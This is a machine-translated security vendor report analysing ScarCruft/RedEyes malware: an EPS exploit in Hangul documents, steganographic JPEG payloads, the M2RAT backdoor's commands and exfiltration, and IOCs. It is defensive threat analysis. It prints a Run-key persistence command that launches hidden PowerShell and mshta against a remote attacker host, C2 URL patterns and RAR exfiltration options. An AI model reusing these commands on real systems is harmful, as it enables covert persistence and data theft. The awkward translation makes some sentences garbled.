1/11
asec-ahnlab-com.translate.goog
/ko/47622/
Hangeul (HWP) malware using steganography: RedEyes (ScarCruft)
muhan ⋮ ⋮ 2/14/2023
The AhnLab Security Emergengy response Center (ASEC) analysis team confirmed in January that the RedEyes
attack group (also known as APT37, ScarCruft) was distributing malicious code through the Hangul EPS
(Encapsulated PostScript) vulnerability (CVE-2017-8291). did In this report, the latest domestic activities of the
RedEyes group are shared.
1. Overview
The RedEyes group is known to steal not only personal PC information but also cell phone data targeting specific
individuals, not companies. The main characteristics of this RedEyes group attack case are the use of Hangul EPS
vulnerability and the spread of malicious code using steganography technique.
The Hangul EPS vulnerability used in the attack is an old vulnerability that has already been patched in the latest
version of the Hangul word processor. The attacker seems to have attempted an attack after knowing in advance that
the attack target (individual) is using an old version of Hangul word processor that supports EPS. In addition, cases in
which the RedEyes group distributed malicious codes using steganography techniques have been confirmed in the
past. In 2019, Kaspersky disclosed that the downloader malware used by the ScarCruft (RedEyes) group used
steganography to download additional malware.
The reason for classifying this attack into the RedEyes group is that steganography was used to download malicious
code, and the registry RUN key registration command related to automatic execution for maintaining C&C server
communication (continuity) is similar to the form used in the past. Because.
Also, the RedEyes group is known to use PowerShell and Chinotto malware to steal PC information and perform
remote control. However, in this attack, unlike the Chinotto malware, a new malware that executes C&C commands
using a shared memory section was identified.
The ASEC analysis team cited the shared memory section name for the newly identified malware.M2RAT
(Map2RAT)named.
2/11
[Figure 1] Shared memory section name information
Through this report, we learn about the RedEyes group's initial access, defense evasion, persistence, and the latest
command control and information leakage (exfiltration) of the newly identified M2RAT malware. Share TTPs (Tactics,
Techniques, and Procedures).
[Figure 2] Attack Scenario Flow Chart
2. Analysis
2.1. Initial Access
On January 13, the attack situation of the Hangul EPS vulnerability (CVE-2017-8291) under the name of “Form.hwp”
was confirmed in AhnLab Smart Defense (ASD). At the time of analysis, HWP documents were not collected, but
EPS files that cause vulnerabilities were obtained.
[Figure 3] ASD infrastructure log
An EPS file is a kind of graphic file format, and is a file that expresses a graphic image using the PostScript
programming language made by Adobe. High-definition vector images can be expressed through EPS, and Hangul
word processor supported a third-party module (ghostscript) to process EPS. However, due to the increase in abuse
cases such as APT attacks using EPS vulnerabilities, the EPS processing third-party module was removed from
Hangul and computer.
For reference, the ASEC analysis team released a detailed analysis report on the CVE-2017-8291 vulnerability in
2019 .
The “form.hwp” file included the vulnerable EPS file (CVE-2017-8291) shown in [Figure 4], and when the user reads
the document file (“form.hwp”), the vulnerability causes attackers to access the third-party module. The shellcode
works.
[Figure 4] EPS vulnerability code (“form.hwp”)
3/11
[Figure 5] Stage 1. Shellcode execution using EPS vulnerability
The shellcode downloads an image (JPEG) file from the attacker's server (C&C) and decrypts the encoded PE file
that exists inside the image file. It also creates a PE file in the %temp% path and executes it.
2.2. Defense Evasion
The shellcode downloaded the image file from the attacker's server and executed additional malicious code. That is,
the attacker used a steganography technique that includes malicious code in an image, which is presumed to be a
technique used to evade network detection. The steganography image file used by the attacker seems to have been
obtained from a website that provides desktop images called “wallup.net”.
[Figure 6] Steganography image file
An image file consists of a normal JPEG header, meta data (XOR key, file size) required for decoding a PE file, and
an encoded PE file.
4/11
[Figure 7] Steganography image file composition information
PE decoding performs xor by byte by using a 16-byte xor key.
16 byte xor key: FD DD 28 F5 7C 48 8E 7E 0C E0 17 77 35 87 3B 49 ( 

0xFD xor 0xB0) = 0x4D (M) 

(0xDD xor 0x87) = 0x5A (Z) 

(0x28 xor 0xB8) = 0x90 

(0xF5) xor 0xF5) = 0x00 

(*MZis the signature of the PE file.)
The final decoded PE file is created and executed under the name lskdjfei.exe in the %temp% path. The function of
the executed PE file is to download additional backdoor malware (M2RAT) and inject it into explorer.exe, and add
power shell and mshta commands to the registry Run key related to auto-execution to maintain continuity with the
attacker's server.
2.3. Persistence
The executed lskdjfei.exe registers the following command in the registry Run key to maintain continuity with the
attacker's server.
Registry key path: HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run
Value Name: RyPO
Value: c:\windows\system32\cmd.exe /c PowerShell.exe -WindowStyle hidden -NoLogo -NonInteractive -ep
bypass ping -n 1 -w 340328 2.2.2.2 || mshta hxxps://www.*****elearning.or[.]kr/popup/handle/1.html
5/11
[Figure 8] Stage 2. Execute the decrypted PE file (download backdoor, add persistence)
It was confirmed that the command registered in the registry Run key is similar to the ScarCruft (RedEyes) group
report released by Kaspersky in 2021 .
[ScarCruft's 2021 Registry Run Key Command (by Kaspersky)]
c:\windows\system32\cmd.exe /c PowerShell.exe -WindowStyle hidden -NoLogo -NonInteractive -ep bypass
ping -n 1 -w 300000 2.2.2.2 || mshta hxxp://[redacted].cafe24[.]com/bbs/probook/1.html
[ RedEyes (ScarCruft) 2023 Registry Run Key Registration Command ]
c:\windows\system32\cmd.exe /c PowerShell.exe -WindowStyle hidden -NoLogo -NonInteractive -ep bypass
ping -n 1 -w 340328 2.2.2.2 || mshta hxxps://www.*******learning.or[.]kr/popup/handle/1.html
Whenever the system is booted by the registered registry key, PowerShell and Windows normal utility mshta are
executed on the victim host PC. At the time of analysis, HTA (HTML Application) files containing JS (JavaScript)
codes were collected in the “1.html” file that mshta downloads from the attacker's server.
The JS code executes the PowerShell command, receives the command from the attacker server, executes it, and
delivers the result.
When PowerShell adds the “U” parameter to the attacker server address and passes the computer name and user
name, the attacker server encodes the CMD command to be executed in BASE64 and sends it to the victim host.
Encoded BASE64 commands are decoded and executed again by PowerShell, and the command execution result is
saved as a file in the %temp%\vnGhazwFiPgQ path. Then, by adding “R” parameter to the attacker’s server, the
command execution result is transmitted in BASE64 encoded state.
hxxps://www.*******elearning.or[.]kr/popup/handle/log.php?U=[computer name]+[user name]// receive
attacker command
hxxps://www.*******elearning.or[.]kr/popup/handle/log.php?R=[BASE64 encoding]// Send command execution
result
6/11
[Figure 9] PowerShell code related to persistence
2.4. M2RAT (Map2RAT)
The backdoor that is finally executed is injected into explorer.exe and operates. The main function of the backdoor is
to perform basic remote control malware functions such as key logging, data (document, voice file) leakage, process
execution/termination, and screen capture.
7/11
[Figure 10] Stage 3. M2RAT backdoor execution stage
However, the backdoor malware identified this time has a different command system from the previously known
Chinotto malware, and does not store keylogging data and screen capture records in the victim system, but transmits
them to the attacker's server, leaving no traces of leaked data on the victim system. am.
The ASEC analysis team cited the common part of the name of the shared memory section used for C&C
communication for the newly identified malicious code, M2RAT (Map2RAT) was named.
FileInputMap2
ProcessInputMap2
CaptureInputMap2
RawInputMap2
RegistryModuleInputMap2
TypingRecordInputMap2
UsbCheckingInputMap2
2.4.1. Command and Control of M2RAT
M2RAT's C&C communication command system receives commands from the attacker's server as the body of the
POST method, and the meaning of the commands is shown in [Table 1] below.
[Figure 11] M2RAT C&C communication capture screen (Fiddler)
C&C
commands
explanation
OKR
Commands received at the time of initial C&C communication connection
URL
Registry key value modification for C&C update
8/11
UPD
Update the C&C you are currently connected to
RES
C&C connection termination (M2RAT termination)
UNI
C&C connection termination (M2RAT termination)
CMD
Perform remote control commands (keylogging, process creation/execution,
etc.)
[Table 1] Attacker command information
The attacker server of M2RAT manages the host by MAC address to identify the victim host. If M2RAT is infected, the
MAC address is encoded (XORed) as 0x5C in the “Version” value of the registry “HKCU\Software\OneDriver” path
and stored. The encoded MAC address value is used by the attacker's server to identify the victim host.
Registry key path: HKCU\Software\OneDriver
Value Name: Version
Value: XOR-encoded (0x5C) MAC address of the victim host
The resulting value of the command transmitted by the attacker to the victim host is stored in the “_encoded MAC
address value_2” folder of the attacker’s server, and the file captured by M2RAT is “_encoded MAC address
value_cap” ” folder. (Refer to [Figure 12])
[Figure 12] Attacker server (example)
(The server screen in [Figure 12] is a screen built by AhnLab's analysis system similar to the attacker's web server.)
In addition, M2RAT XOR-encodes the attacker's server address information to the “Property” value of the same
registry key path as the MAC address and stores it as 0x5C.
Registry key path: HKCU\Software\OneDriver
Value name: Property
Value: Attacker server address XOR-encoded (0x5C) value
Later, the attacker can send “URL” and “UPD” commands to M2RAT to update the attacker’s server address (refer to
[Table 1]). The “URL” command is a command used to update the registry key with a new attacker address. , “UPD”
command is a command to change the attacker server address of currently running M2RAT.
M2RAT's remote control command is made by receiving the CMD command from the attacker's server. In the case of
the Chinotto malware previously confirmed to have been used by the RedEyes group, remote control commands
were executed in the form of query strings , but in the case of M2RAT, a shared memory section was created to
execute remote control commands from the attacker's server. This seems to be to evade network detection by
concealing command information as the POST body, just as the attacker used steganography in the initial infiltration
stage. 

( * Query string : a string starting with a question mark at the end of the URL)
The CMD command is delivered through the shared memory, and the name information of the memory section is
shown in [Table 2].
section name
function
RegistryModuleInputMap2 Transmission of additional module execution results (ex. mobile phone data leakage module)
FileInputMap2
(A:\ ~ Z:\) Search drive files, create/write files, read files, change file time
CaptureInputMap2
Screen capture of current victim host PC
ProcessInputMap2
Check process list, process creation/termination
RawInputMap2
Executing a process using the ShellExectueExW API
TypingRecordInputMap2
Keylogging data leak
UsbCheckingInputMap2
USB data leak 

(hwp,doc,docx,xls,xlsx,ppt,pptx,cell,csv,show,hsdt,mp3,amr,3gp,m4a,txt,png,jpg,jpeg,gif,pdf,eml)
[Table 2] Functions of the shared memory section
2.4.2. Information Exfiltration
M2RAT's information leakage function includes screen capture of the victim host, process information, key logging,
and data (document, voice file) leakage. First, in the case of screen capture, even if the attacker does not issue a
command, it is periodically captured and sent to the attacker's server, and the server saves it as “result_[number]” in
the “_encoded MAC address value_cap” folder.
In addition, all data leakage information is stored in the “_encoded MAC address value_2” folder of the attacker’s web
server.
9/11
In particular, if there are documents and voice recording files that are sensitive data in a removable disk or shared
folder, the files are copied to the %TEMP% path, password-compressed with Winrar (RAR.exe), and the result is sent
to the attacker's server.
Data copy folder path: %Temp%\Y_%m_%d_%H_%M_%S // (ex.
%TEMP%\Year_Month_Day_Hour_Minute_Second)
File extension : hwp,doc,docx,xls,xlsx,ppt,pptx,cell,csv,show,hsdt,mp3,amr,3gp,m4a,txt,png,jpg,jpeg,gif,pdf,eml
The RAR.exe options used are as follows. The compressed file creation path is the same as the %TEMP% folder
path.
a -df -r -hpdgefiue389d@39r#1Ud-m1 “Compressed file creation path” “Compressed destination path”
option name explanation
a
compression
df
Delete files after compression
r
Compressed File Recovery
hp
File data and header encryption
m
Set compression level
[Table 3] Description of RAR compression options
The ASEC analysis team was able to additionally identify information leaking malware that communicates with
M2RAT through the AhnLab Smart Defense (ASD) infrastructure. The malicious code steals document files stored in
the mobile phone and uses M2RAT.RegistryModuleResultMap2It was identified as a .Net file sending leak data to a
shared memory section named .
[Figure 13] Code to transmit leaked data to M2RAT
10/11
[Figure 14] Mobile phone data stealing target (extension) information
The PDB information of the corresponding .Net file is as follows.

PDB:
E:\MyWork\PhoneDataCp\PhoneDeviceManager\PhoneDeviceManager\obj\x86\Release\PhoneDeviceManager.pdb
3. Conclusion
The RedEyes group is a state-backed APT hacking organization. It is known to carry out attacks against individuals
such as human rights activists, journalists, and North Korean defectors, and the target of the attack seems to be
information leakage. These APT attacks are very difficult to defend against, and in particular, the RedEyes group is
known to mainly attack individuals, so it may be difficult for non-corporate individuals to even recognize the damage.
The ASEC analysis team is closely tracking the group, and if the attacker's new TTPs are identified, they will be
shared quickly as in this blog to contribute to minimizing damage.
4. IOCs
[ MD5 (진단명, 엔진버전) ] 

8b666fc04af6de45c804d973583c76e0 // EPS 파일 – Exploit/EPS.Generic (2023.01.16.03) 

93c66ee424daf4c5590e21182592672e // 스테가노그래피 JPEG – Data/BIN.Agent (2023.02.15.00) 

7bab405fbc6af65680443ae95c30595d // PE file(JPEG ) Stage PE 파일 – Trojan/Win.Loader.C5359534
(2023.01.16.03) 

9083c1ff01ad8fabbcd8af1b63b77e66 // 파워쉘 스크립트 – Downloader/PS.Generic.SC185661 (2023.01.16.03) 

11/11
4488c709970833b5043c0b0ea2ec9fa9 // M2RAT – Trojan/Win.M2RAT.C5357519 (2023.01 .14.01) 
7f5a72be826ea2fe5f11a16da0178e54 // Cell phone data theft – Infostealer/Win.Phone.C5381667 (2023.02.14.03)
5. Reference report
scarcruft-surveilling-north-korean-defectors-and-human-rights-activists – Kaspersky
TTPs #9: Analysis of Attack Strategies Monitoring Individuals' Daily Lives -KrCert/CC
TTPs $ ScarCruft Tracking Note – KrCert/CC
'Ghost' hidden in Hangul files – ASEC Analysis Team
Categories: Malware Information
Tagged as: APT37 , M2RAT , MaptoRAT , RedEyes , ScarCruft
